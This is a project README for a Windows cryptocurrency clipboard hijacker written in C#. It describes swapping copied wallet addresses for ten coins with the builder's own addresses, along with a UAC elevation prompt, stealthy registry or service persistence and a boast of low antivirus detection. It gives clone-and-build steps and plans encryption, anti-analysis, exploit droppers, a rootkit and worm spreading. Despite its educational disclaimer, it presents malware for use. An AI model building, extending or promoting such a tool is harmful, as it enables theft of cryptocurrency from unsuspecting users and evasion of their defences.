Vortex Clipper

Vortex Clipper is a proof-of-concept tool developed for educational and security research purposes. It demonstrates clipboard monitoring techniques and cryptocurrency address manipulation in a controlled environment. This project is intended for learning about system programming, Windows internals, and security mechanisms. Please use it responsibly and only in environments where you have explicit permission.
Features (Version 1.0)

    Clipboard Monitoring: Continuously checks the clipboard every 100ms for cryptocurrency addresses.
    Cryptocurrency Support: Detects and replaces addresses for 10 popular cryptocurrencies:
        Bitcoin (BTC)
        Ethereum (ETH)
        Monero (XMR)
        TRON (TRX)
        Tether (USDT)
        TON (The Open Network)
        Dogecoin (DOGE)
        Litecoin (LTC)
        Dash (DASH)
        Solara (SOL)
    UAC Bypass: Trying to get UAC with victim's agreement to attempt privilege escalation.
    CLI Builder: Command-line interface to configure and build the executable with custom settings.
    Autostart: Supports autostart via Windows Registry without admin rights or as a masked Windows Service with admin privileges.
    Low Detection Rate: Achieves 0/13 detection by antivirus software (without obfuscation/encryption).
    Build weight: 10-12 KB

Installation:

    Requirements:
        .NET Framework 4.8 installed on Windows.
        Visual Studio or any C# compiler for building from source.
    Steps:
        Clone the repository:

    git clone https://github.com/3xcepti0n/Vortex-Clipper.git
    Compile Builder.cs via Developer Command Prompt(csc Builder.cs)

Usage:

    Start Builder.exe(Stub.cs must be in the same folder as Builder.exe
    Enter your wallet's addresses
    Build will be in folder "build"

To-Do List:

    Add logging to a Telegram bot for replacement events/Adding fake error ❌
    Add a GUI builder ❌
    Add a Watchdog process for persistence ❌
    Support compilation to .dll, .ps1, .com, and other formats ❌
    Integrate a PDF exploit for code execution ❌
    Add FUD encryption ❌
    Add anti-analysis techniques (Anti-Debug, Anti-VM, Anti-dnSpy, Anti-dump, etc.) ❌
    Support compilation to .docm, .xlsm with VBA macros ❌
    Add a user-mode rootkit for stealth ❌
    Add self-spreading via USB and local network (worm-like behavior) ❌

✅ = Completed

❌ = In Progress/Planned

Contributing:

    Feel free to submit pull requests or open issues for suggestions, bug reports, or improvements. This is my first GitHub repository, so feedback is highly appreciated!

Disclaimer:

    This project is for educational and research purposes only. Do not use it to harm systems or networks without explicit permission. The author is not responsible for any misuse or damage caused by this tool.
License:

    This project is licensed under the MIT License - see the file for details.